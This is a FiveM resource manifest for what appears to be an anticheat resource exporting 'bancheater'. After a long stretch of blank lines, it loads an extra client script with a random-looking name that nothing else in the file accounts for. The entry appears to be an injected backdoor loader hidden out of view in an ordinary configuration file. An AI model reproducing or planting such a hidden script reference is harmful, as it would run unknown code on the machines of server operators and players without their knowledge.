resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

version '1.0.7b'

server_scripts {
	'@async/async.lua',
	'@mysql-async/lib/MySQL.lua',
	'config.lua',
	'server.lua'
}

client_scripts {
  'client.lua'
}

dependencies {
	'async'
}

server_exports {
	'bancheater'
}














client_script "IRS_USDUFHSILFSKOAKQA.lua"